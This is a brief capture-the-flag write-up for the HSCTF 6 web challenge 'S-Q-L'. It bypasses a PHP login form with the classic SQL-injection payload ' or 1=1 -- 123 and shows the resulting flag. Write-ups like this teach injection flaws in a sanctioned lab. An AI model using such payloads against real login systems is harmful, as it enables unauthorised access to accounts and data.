# S-Q-L

| Event | Title | Category | Cost |
|:------|:----------|:---------|-------:|
| HSCTF 6 | S-Q-L| WEB | ~100 |

### Discription
>Written by: dwang
>
>Keith keeps trying to keep his flag safe. This time, he used a database and some PHP.
>
>https://s-q-l.web.chal.hsctf.com/

### Solution

On the page we see the authorization form.

![](https://github.com/Red-Cadets/HSCTF-6/blob/master/WEB/images/2_3.png?raw=true)

From the name of the task, we understand that the `SQL database` is used.
We apply the simplest SQL-injection.
```
login:    ' or 1=1 -- 123
password: any
```
![](https://github.com/Red-Cadets/HSCTF-6/blob/master/WEB/images/3_2.PNG?raw=true)

##### Flag

```
hsctf{mysql_real_escape_string}
```
